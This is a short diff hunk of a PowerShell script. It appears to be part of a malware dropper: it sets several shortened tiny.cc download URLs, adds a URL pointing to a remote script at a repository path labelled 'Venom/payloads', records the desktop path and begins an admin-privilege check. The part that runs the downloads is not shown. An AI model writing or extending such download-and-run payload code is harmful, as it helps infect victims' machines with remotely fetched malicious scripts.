@@ -19,7 +19,7 @@ Set-Variable -Name zipUrl -Value ("http://tiny.cc/f7cg001")
 Set-Variable -Name zipUrl_1 -Value ("http://tiny.cc/k7cg001")
 Set-Variable -Name zipUrl_2 -Value ("http://tiny.cc/p7cg001")
 Set-Variable -Name zipUrl_3 -Value ("http://tiny.cc/v7cg001")
-Set-Variable -Name Url_1 -Value ("http://tiny.cc/g1pg001")
+Set-Variable -Name Url_1 -Value ("https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks3.ps1")
 Set-Variable -Name desktopPath -Value ([Environment]::GetFolderPath("Desktop"))
 function Test-IsAdmin {
     Set-Variable -Name currentUser -Value (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()))
